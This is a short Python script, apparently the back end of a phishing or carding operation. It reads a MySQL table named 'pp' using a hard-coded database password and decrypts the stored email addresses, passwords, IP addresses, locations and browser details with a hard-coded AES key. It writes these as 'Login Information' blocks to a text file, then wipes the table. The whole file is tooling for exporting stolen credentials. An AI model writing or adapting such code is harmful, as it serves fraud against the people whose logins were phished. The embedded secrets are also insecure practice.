import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import mysql.connector

conn = mysql.connector.connect(host='localhost', database='bin', user='binbot', password='F00tbal!!')
query_conn = conn.cursor(buffered=True)

__key__ = hashlib.sha256(b'bin-bot-encrypt!').digest()
def encrypt(raw):
    BS = AES.block_size
    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)

    raw = base64.b64encode(pad(raw).encode('utf8'))
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key= __key__, mode= AES.MODE_CFB,iv= iv)
    return base64.b64encode(iv + cipher.encrypt(raw))

def decrypt(enc):
    unpad = lambda s: s[:-ord(s[-1:])]

    enc = base64.b64decode(enc)
    iv = enc[:AES.block_size]
    cipher = AES.new(__key__, AES.MODE_CFB, iv)
    return unpad(base64.b64decode(cipher.decrypt(enc[AES.block_size:])).decode('utf8'))

def get_available_pp():
    result_text = ""
    sample_text = "+ ----------- Login Information ------------+\n+ ------------------------------------------+\n| id: %s\n%s%s+ ------------------------------------------+\n%s%s%s%s%s+ ------------------------------------------+\n\n"
    query = "select email, password, ip_address, location, user_agent, browser, platform, id from pp where 1"
    query_conn.execute(query)
    f_list = query_conn.fetchall()
    for f in f_list:
        result_text += sample_text % (
            f[7], decrypt(f[0]), decrypt(f[1]), decrypt(f[2]), decrypt(f[3]), decrypt(f[4]), decrypt(f[5]), decrypt(f[6]))
    with open("pp_available.txt", "w") as pp_file:
        pp_file.write(result_text)

get_available_pp()

query_conn.execute("delete from pp")
conn.commit()

print("PP export are finished!")
